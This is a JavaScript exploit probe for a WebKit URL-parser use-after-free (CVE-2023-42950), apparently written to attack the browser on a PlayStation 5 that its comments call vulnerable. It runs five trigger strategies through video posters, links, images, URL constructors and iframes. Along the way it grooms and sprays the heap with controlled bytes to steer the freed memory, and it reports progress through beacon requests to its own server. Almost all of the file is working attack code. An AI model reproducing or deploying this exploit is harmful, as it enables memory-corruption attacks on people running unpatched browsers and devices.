// p188 — URLParser stale StringView UAF (CVE-2023-42950 / Bug 263682)
// WTF::URLParser::parse heap-use-after-free
// Fixed Dec 15, 2023 (Safari 17.2). PS5 runs 17.0 = VULNERABLE.
//
// Root cause: StringView urlScheme created pointing into m_asciiBuffer
// BEFORE appendToASCIIBuffer(':') which may reallocate the buffer.
// StringView becomes a dangling pointer to freed heap memory.
//
// Fix: swap two lines — create StringView AFTER the append.
//
// Trigger: Set any URL attribute to a string that:
//   1. Has a scheme-like prefix (chars + ':')
//   2. Is long enough to cause m_asciiBuffer reallocation
//
// The stale StringView reads freed heap data as a "scheme" string.
// If we spray controlled data into the freed buffer, we control
// what scheme() reads → potential for further corruption.
//
// Beacon prefix: V188-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V188-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Original test case trigger string
  var triggerChars = [117,67,45,112,50,57,122,86,51,72,81,67,110,100,111,43,58,74];
  var triggerStr = String.fromCharCode.apply(null, triggerChars);
  // = "uC-p29zV3HQCndo+:J"

  // Strategy 1: Exact reproduction of the test case
  function testOriginal() {
    syncB('S1-START');
    try {
      var v = document.createElement('video');
      v.preload = 'metadata';
      document.body.appendChild(v);

      // Set poster to the trigger URL
      v.poster = triggerStr;
      syncB('S1-POSTER-SET');

      // Clean up
      v.remove();
      syncB('S1-DONE');
    } catch(e) {
      syncB('S1-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // Strategy 2: Longer strings to increase reallocation probability
  // The key is having scheme chars followed by ':' with enough length
  // to trigger m_asciiBuffer growth
  function testLongScheme(attempt) {
    syncB('S2-' + attempt + '-START');
    try {
      // Build a string: long scheme name + ':' + rest
      // The scheme name needs to be valid scheme chars (alpha + digit + +.-)
      var schemeLen = 64 + attempt * 32;  // 64, 96, 128, 160, 192
      var scheme = '';
      for (var i = 0; i < schemeLen; i++) {
        scheme += String.fromCharCode(97 + (i % 26)); // a-z repeating
      }
      var url = scheme + ':' + 'x'.repeat(256);

      var elem = document.createElement('a');
      document.body.appendChild(elem);
      elem.href = url;
      syncB('S2-' + attempt + '-HREF-SET');

      elem.remove();
      syncB('S2-' + attempt + '-DONE');
    } catch(e) {
      syncB('S2-' + attempt + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // Strategy 3: Rapid URL parsing with heap pressure
  // Parse many URLs rapidly to increase chance of hitting realloc
  function testRapidParse(attempt) {
    syncB('S3-' + attempt + '-START');
    try {
      // Create heap pressure
      var garbage = [];
      for (var g = 0; g < 200; g++) {
        garbage.push(new ArrayBuffer(1024));
      }

      // Build URLs of increasing length to trigger buffer growth
      var urls = [];
      for (var i = 0; i < 50; i++) {
        var len = 16 + i * 8;
        var scheme = '';
        for (var j = 0; j < len; j++) {
          scheme += String.fromCharCode(65 + (j % 26));
        }
        urls.push(scheme + ':rest');
      }

      // Spray ArrayBuffers with controlled data before parsing
      var sprays = [];
      for (var s = 0; s < 500; s++) {
        var ab = new ArrayBuffer(128);
        var v = new Uint32Array(ab);
        v[0] = 0x41414141;
        v[1] = 0x42424242;
        sprays.push(ab);
      }

      // Free the garbage to create holes
      garbage = null;

      // Now parse all URLs rapidly
      var img = document.createElement('img');
      for (var i = 0; i < urls.length; i++) {
        img.src = urls[i];
      }

      syncB('S3-' + attempt + '-PARSED-' + urls.length);

      // Also try via URL constructor
      for (var i = 0; i < urls.length; i++) {
        try {
          new URL(urls[i]);
        } catch(e) {
          // Expected — invalid URLs
        }
      }

      syncB('S3-' + attempt + '-URL-CTOR-DONE');
    } catch(e) {
      syncB('S3-' + attempt + '-ERR');
    }
  }

  // Strategy 4: Video poster (exact reproduction) with heap spray
  function testPosterSpray(attempt) {
    syncB('S4-' + attempt + '-START');
    try {
      // Pre-allocate spray
      var sprays = [];
      for (var s = 0; s < 1000; s++) {
        var ab = new ArrayBuffer(64);
        var v = new Uint8Array(ab);
        // Fill with 'file' scheme bytes to redirect URL handling
        v[0] = 0x66; // f
        v[1] = 0x69; // i
        v[2] = 0x6c; // l
        v[3] = 0x65; // e
        sprays.push(ab);
      }

      // Create many videos and set poster
      for (var i = 0; i < 20; i++) {
        var v = document.createElement('video');
        v.preload = 'metadata';
        document.body.appendChild(v);

        // Varying trigger strings
        var padding = 'z'.repeat(32 + i * 16);
        v.poster = padding + triggerStr;
      }

      syncB('S4-' + attempt + '-POSTERS-SET');

      // Clean up all videos
      var videos = document.querySelectorAll('video');
      for (var i = 0; i < videos.length; i++) {
        videos[i].remove();
      }

      syncB('S4-' + attempt + '-DONE');
    } catch(e) {
      syncB('S4-' + attempt + '-ERR');
    }
  }

  // Strategy 5: iframe src parsing (different code path)
  function testIframeSrc(attempt) {
    syncB('S5-' + attempt + '-START');
    try {
      for (var i = 0; i < 10; i++) {
        var f = document.createElement('iframe');
        var scheme = '';
        for (var j = 0; j < 100 + i * 20; j++) {
          scheme += String.fromCharCode(97 + (j % 26));
        }
        f.src = scheme + '://rest.of.url/path';
        document.body.appendChild(f);
        f.remove();
      }
      syncB('S5-' + attempt + '-DONE');
    } catch(e) {
      syncB('S5-' + attempt + '-ERR');
    }
  }

  // Run all strategies
  testOriginal();

  for (var i = 0; i < 5; i++) {
    testLongScheme(i);
  }

  for (var i = 0; i < 3; i++) {
    testRapidParse(i);
  }

  for (var i = 0; i < 3; i++) {
    testPosterSpray(i);
  }

  for (var i = 0; i < 3; i++) {
    testIframeSrc(i);
  }

  syncB('ALL-DONE');
})();
